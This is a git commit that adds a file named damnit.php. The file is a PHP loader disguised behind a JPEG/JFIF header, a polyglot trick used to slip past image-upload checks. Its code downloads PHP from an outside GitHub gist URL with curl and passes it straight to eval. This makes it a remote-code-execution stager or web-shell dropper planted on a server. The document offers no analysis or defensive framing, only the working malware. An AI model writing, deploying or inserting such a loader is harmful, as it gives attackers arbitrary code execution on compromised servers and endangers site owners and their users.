e1691faaa3b6f97811471436ca3aaaf6fe3a3b95
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-08-16 16:32:57 +0700

    Create damnit.php

---
+++ damnit.php
@@ -0,0 +1,15 @@
+ÿØÿà JFIF ÿþ;<?pHp
+   function get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+      eval('?>' . get('https://gist.githubusercontent.com/paknago21/55f93a82c8e952a5f38c60c455047d23/raw/c5dde63695225ac88c6a662e2ed9ca448205935e/msad.php'));
+?>
